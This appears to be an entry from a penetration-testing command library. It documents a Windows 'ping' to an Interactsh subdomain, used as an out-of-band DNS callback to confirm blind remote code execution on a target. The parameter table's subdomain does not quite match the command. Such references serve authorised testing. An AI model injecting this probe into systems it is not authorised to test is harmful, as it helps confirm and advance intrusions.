---
id: b9a79d72-917f-4c30-ac12-207df97374d9
name: ping-interactsh
type: command
executor: cmd
data: ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.114Z'
platforms:
  - Windows
tags:
  - oob
  - rce
verified: false
validated: true
submitted: true
---

# ping-interactsh

## Command

```cmd
ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com
```

## Description

Executes a ping to a unique Interactsh subdomain, generating observable DNS requests for blind RCE confirmation in exploitation scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com` | Unique long subdomain for Interactsh OOB capture | Yes |

## Examples

### Basic Usage

```cmd
ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com
```

### Advanced Usage

N/A (simple ping for DNS trigger)

## Expected Output

DNS resolution attempt to the domain, observable as a query on the Interactsh server; no local output needed for confirmation.

## Related

- [[Related Procedure|procedures/Observe-RCE-Confirmation-via-Interactsh]]
